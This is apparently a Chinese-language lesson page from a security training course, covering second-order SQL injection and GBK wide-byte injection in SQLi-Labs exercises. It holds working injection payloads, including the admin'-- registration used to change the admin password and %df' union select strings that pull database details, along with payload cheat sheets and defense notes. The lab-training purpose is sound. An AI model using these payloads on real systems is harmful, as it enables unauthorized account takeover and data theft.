---
title: Day035：SQL 注入进阶 - 二次注入与宽字节注入
tags:
  - 网络安全
  - SQL注入
  - 二次注入
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d035
date: 2026-02-26
updated: 2026-01-28
---

# Day035：SQL 注入进阶 - 二次注入与宽字节注入

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 6：SQL 注入进阶 |
| **今日主题** | 二次注入与宽字节注入 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：你在注册页面输入 `admin'--`，网站没有报错，注册成功了。但当你登录后修改密码时，居然把 admin 的密码改了！
>
> **问题**：明明注册时做了转义，怎么还能注入？
>
> **今天的任务**：学习"二次注入"和"宽字节注入"——两种最隐蔽的注入方式。

---

## 今日目标

- [ ] 理解二次注入的原理
- [ ] 完成二次注入实战
- [ ] 理解宽字节注入原理
- [ ] 成功绕过 addslashes 防护

**闯关条件**：利用二次注入修改目标用户密码。

---

## 实战任务（先动手！）

### 任务 1：理解二次注入（20 分钟）

**什么是二次注入**：

```
1. 用户输入恶意数据 → 被转义后存入数据库
2. 程序从数据库读取数据 → 没有再次转义
3. 读取的数据用于新的 SQL 语句 → 触发注入
```

**关键点**：存入时安全，取出时危险！

**记录**：
```
与普通注入的区别：________________
```

---

### 任务 2：二次注入实战（50 分钟）

**环境**：SQLi-Labs Less-24（二次注入专项）

**攻击场景**：
1. 注册用户名：`admin'--`
2. 登录 `admin'--`
3. 修改密码

**分析代码逻辑**：

```sql
-- 注册时（被转义，安全）
INSERT INTO users (username, password) VALUES ('admin\'--', 'newpass');

-- 修改密码时（从数据库取出，未转义）
UPDATE users SET password='newpass' WHERE username='admin'--'
-- 实际执行
UPDATE users SET password='newpass' WHERE username='admin'
```

**操作步骤**：

1. 注册用户名 `admin'--`，密码随意
2. 用 `admin'--` 登录
3. 修改密码为 `hacked123`
4. 用 `admin` / `hacked123` 登录

**记录**：
```
注册结果：________________
修改密码结果：________________
admin 登录结果：________________
```

---

### 任务 3：宽字节注入原理（25 分钟）

**原理**：

当数据库使用 GBK 编码时：
- `addslashes()` 将 `'` 转义为 `\'`（`%5c%27`）
- 在 GBK 编码中，`%df%5c` 组成一个汉字（運）
- 输入 `%df'` → 转义后 `%df%5c%27` → GBK 解析为 `運'`
- 单引号逃逸成功！

**Payload**：
```
%df' or 1=1--
%df' union select 1,2,3--
```

**记录**：
```
%df%5c 对应的汉字：________________
```

---

### 任务 4：宽字节注入实战（40 分钟）

**环境**：SQLi-Labs Less-32（宽字节注入）

**操作步骤**：

1. 正常输入 `'`，观察被转义
2. 输入 `%df'`，观察结果
3. 构造完整 payload

**Payload 示例**：
```sql
?id=1%df' union select 1,2,3--+
?id=1%df' union select database(),user(),version()--+
```

**记录**：
```
正常输入 ' 的结果：________________
输入 %df' 的结果：________________
成功的 payload：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解二次注入原理 | 20 分 |
| 成功完成二次注入 | 25 分 |
| 理解宽字节注入原理 | 20 分 |
| 成功完成宽字节注入 | 25 分 |
| 能解释两种注入的适用场景 | 10 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### 二次注入深度分析

**为什么会发生**：

```
程序员思维：
"我在插入时做了转义，数据是安全的"
"从自己数据库读出来的数据，当然是可信的"

攻击者思维：
"数据在数据库里是原始的"
"如果你取出来不再转义，我就能注入"
```

**典型场景**：

| 场景 | 存入点 | 触发点 |
|------|--------|--------|
| 用户资料修改 | 注册时的用户名 | 修改密码的 SQL |
| 评论系统 | 评论内容 | 后台审核/展示 |
| 日志系统 | 用户输入 | 日志分析脚本 |

### 宽字节注入条件

**三个必要条件**：

1. 数据库使用 GBK/GB2312 等宽字节编码
2. 程序使用 addslashes() 或 mysql_real_escape_string()
3. 连接数据库时设置了 `SET NAMES 'gbk'`

**常见宽字节组合**：

| 输入 | 转义后 | GBK 解析 |
|------|--------|----------|
| `%df'` | `%df%5c%27` | `運'` |
| `%bf'` | `%bf%5c%27` | `縗'` |
| `%aa'` | `%aa%5c%27` | `忖'` |

### 防御方法

**二次注入防御**：
1. 从数据库取出的数据，使用前仍需验证/转义
2. 使用参数化查询（Prepared Statement）
3. 存入时就做严格的输入验证

**宽字节注入防御**：
1. 统一使用 UTF-8 编码
2. 使用 `mysql_set_charset('utf8')` 而非 `SET NAMES`
3. 使用 PDO 的参数化查询

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| 找不到二次注入 | 没有触发点 | 多关注用户资料修改、密码重置等场景 |
| 宽字节不生效 | 注入失败 | 确认数据库是 GBK 编码 |
| %df 被 URL 解码 | 变成乱码 | 用 Burp 直接发送二进制数据 |

---

## 知识卡片速查

### 二次注入 Payload 模板

```sql
# 注册恶意用户名
admin'--
admin'#
admin'/*

# 触发场景
修改密码、修改资料、删除操作
```

### 宽字节注入 Payload 模板

```sql
# 逃逸单引号
%df'
%bf'
%aa'

# 完整注入
%df' or 1=1--+
%df' union select 1,2,3--+
%df' and 1=1--+
```

### 判断是否可宽字节

```sql
# 观察响应
?id=1%df'   # 如果报错格式变化，可能存在宽字节
?id=1%5c'   # 正常转义对比
```

---

## 常见问题

**Q1：二次注入怎么找？**

A1：
1. 找"存入"和"取出"分离的场景
2. 注册/修改资料/评论等功能
3. 关注 UPDATE、DELETE 语句

**Q2：为什么宽字节注入现在很少见？**

A2：
1. UTF-8 成为主流编码
2. 现代框架默认使用参数化查询
3. 但老系统、国内老项目仍可能存在

**Q3：二次注入可以用 SQLMap 检测吗？**

A3：SQLMap 支持二次注入，需要用 `--second-url` 参数指定触发 URL。

---

## 明日预告

**Day 036：SQL 注入进阶 - 综合练习**

明天你将：
- 综合运用本周所学的所有技巧
- 完成 SQLi-Labs 综合挑战
- 为 Week 6 总结做准备

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 二次注入完成 | 是/否 |
| 宽字节注入完成 | 是/否 |
| 今日收获 | |

---

> **导师点评**：
>
> 今天学的两种注入，都属于"高级玩法"。
>
> 二次注入考验的是你对程序逻辑的理解——数据流是怎么走的，哪里做了过滤，哪里没做。
>
> 宽字节注入考验的是你对编码的理解——这是老一代渗透者的必备技能。
>
> 虽然现在 UTF-8 普及，宽字节少见了。但道理是相通的：**安全问题往往出在"边界"——编码边界、信任边界、处理边界**。
>
> 记住：**漏洞总是藏在你觉得"应该没问题"的地方**。

```bash
echo "Day 035 Complete! 二次注入 + 宽字节注入！"
```
